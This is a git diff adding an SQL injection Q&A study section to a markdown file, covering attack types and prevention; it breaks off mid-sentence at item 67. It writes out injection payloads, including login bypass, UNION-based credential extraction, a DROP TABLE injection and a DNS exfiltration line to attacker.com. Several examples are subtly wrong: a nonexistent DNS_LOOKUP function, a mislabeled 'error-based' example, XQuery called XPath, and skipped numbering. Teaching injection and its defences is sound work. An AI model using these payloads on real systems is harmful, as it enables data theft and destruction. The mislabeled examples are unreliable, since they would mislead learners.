@@ -1017,6 +1017,87 @@ fs.readFile('file1.txt', 'utf8', (err, data) => {
       ```
   
 
+### Basic SQL Injection Concepts (1-20)
+1. What is SQL injection?
+   - SQL injection is a type of cyber attack where malicious SQL statements are inserted into an input field, allowing attackers to manipulate the database backend.
+2. How can SQL injection be prevented?
+   - Using parameterized queries or prepared statements can prevent SQL injection by separating SQL code from user input.
+3. What are the dangers of SQL injection attacks?
+   - SQL injection attacks can lead to data loss, unauthorized access to sensitive information, and potential damage to the database structure.
+4. Provide an example of a simple SQL injection attack.
+   - Example: Suppose an attacker enters `' OR 1=1; --` into a login form's username field to bypass authentication.
+5. How do you identify and test for SQL injection vulnerabilities?
+   - By inputting special characters or SQL syntax into input fields and observing the application's response, you can test for SQL injection vulnerabilities.
+6. Explain the role of sanitization and validation in preventing SQL injection.
+   - Sanitization removes or escapes potentially harmful characters from user input, while validation checks input against predefined rules to ensure it's safe for processing.
+7. What are the common methods used by attackers in SQL injection attacks?
+   - Attackers often use techniques like union-based injection, error-based injection, blind injection, and time-based injection to exploit SQL vulnerabilities.
+8. How do you securely handle user input in SQL queries?
+   - By using parameterized queries or prepared statements, you can safely include user input in SQL queries without risking SQL injection vulnerabilities.
+9. What are the consequences of a successful SQL injection attack?
+   - Consequences include data leakage, unauthorized access, data manipulation, and potentially severe damage to the database and application.
+10. How do you prevent SQL injection in dynamic SQL queries?
+    - By using stored procedures or ORM frameworks, you can reduce the risk of SQL injection in dynamic SQL queries.
+
+### Intermediate SQL Injection Techniques (21-40)
+21. What is a blind SQL injection attack?
+    - A blind SQL injection attack involves exploiting vulnerabilities without directly seeing the results, often through boolean-based or time-based techniques.
+22. Provide an example of a boolean-based blind SQL injection attack.
+    - Example: `' OR 1=1; --` returns true, while `' OR 1=2; --` returns false, helping attackers infer database structures.
+23. What is an error-based SQL injection attack?
+    - An error-based SQL injection attack leverages error messages returned by the database to extract information or manipulate the query.
+24. Provide an example of an error-based SQL injection attack.
+    - Example: Injecting `' OR 1=1; DROP TABLE users; --` might trigger an error message revealing the database structure or execute a destructive command.
+25. What is a union-based SQL injection attack?
+    - A union-based SQL injection attack combines multiple SQL queries using the UNION keyword to extract data from different tables.
+26. Provide an example of a union-based SQL injection attack.
+    - Example: Injecting `' UNION SELECT username, password FROM users; --` can retrieve user credentials from the 'users' table.
+27. What is time-based SQL injection?
+    - Time-based SQL injection involves delaying responses to extract information based on database response times.
+28. Provide an example of a time-based SQL injection attack.
+    - Example: Injecting `' OR IF(1=1, SLEEP(5), 0); --` can delay the response if the condition is true, indicating successful injection.
+29. How do you exploit SQL injection vulnerabilities in numeric input fields?
+    - By injecting mathematical operations or logical conditions, attackers can exploit vulnerabilities in numeric input fields.
+30. How do you mitigate SQL injection vulnerabilities in stored procedures?
+    - Use parameterized stored procedures with input validation and access controls to mitigate SQL injection vulnerabilities in stored procedures.
+
+### Advanced SQL Injection Techniques (41-60)
+41. What is out-of-band (OOB) SQL injection?
+    - Out-of-band SQL injection involves leveraging data exfiltration or command execution through alternative communication channels.
+42. Provide an example of out-of-band SQL injection using DNS exfiltration.
+    - Example: Injecting `' OR DNS_LOOKUP('attacker.com'); --` can trigger DNS requests to the attacker's domain for data exfiltration.
+43. How do you perform SQL injection attacks on NoSQL databases?
+    - By injecting NoSQL-specific syntax or commands, attackers can exploit vulnerabilities in NoSQL databases.
+44. Provide an example of a NoSQL injection attack.
+    - Example: Injecting `{"$gt": ""}` in a MongoDB query can bypass authentication checks due to the $gt (greater than) operator.
+45. What is second-order SQL injection?
+    - Second-order SQL injection involves injecting malicious code into the application's data storage, which is later executed in a different context.
+46. Provide an example of a second-order SQL injection attack.
+    - Example: Attacker injects malicious code into a comment field, which is stored in the database and later executed in a different context, such as when the comment is displayed.
+47. What are stored procedure injection attacks?
+    - Stored procedure injection attacks involve manipulating or executing stored procedures within the database to exploit vulnerabilities.
+48. Provide an example of a stored procedure injection attack.
+    - Example: Injecting `'; EXEC sp_executesql N'SELECT * FROM users WHERE username = ''admin''; --` can execute a SQL query within a stored procedure.
+49. How do you perform SQL injection attacks on XML-based databases?
+    - By injecting XPath queries or XML-specific syntax, attackers can exploit vulnerabilities in XML-based databases.
+50. Provide an example of an XML injection attack.
+    - Example: Injecting `'; FOR $i IN doc("users.xml")//user RETURN $i; --` in an XPath query can retrieve data from an XML database.
+
+### SQL Injection Prevention and Mitigation (61-80)
+61. What are some best practices for preventing SQL injection in web applications?
+    - Use parameterized queries, input validation, and output encoding, implement least privilege principle, and regularly update and patch software.
+62. How do you implement input validation to prevent SQL injection?
+    - Validate input against expected data types, lengths, and patterns, and reject inputs that don't meet validation criteria.
+63. How do you sanitize user input to prevent SQL injection?
+    - Use input sanitization techniques like escaping special characters, using whitelists, or using libraries with built-in sanitization functions.
+64. How do you implement stored procedures or prepared statements to prevent SQL injection?
+    - Use stored procedures with parameterized inputs or prepared statements with placeholders to separate SQL code from user input.
+65. How do you secure database connections and credentials to prevent SQL injection?
+    - Use encrypted connections (SSL/TLS), secure credential storage (environment variables or secure vaults), and limit database user privileges.
+66. How do you perform security testing and code reviews to detect SQL injection vulnerabilities?
+    - Conduct security testing using tools like SQLMap, perform code reviews to identify vulnerable code, and use static analysis tools for automated vulnerability scanning.
+67. What are some common mistakes that lead to SQL injection vulnerabilities?
+    - Concatenating user input directly into SQL queries, using outdated or insecure database
 
 
 
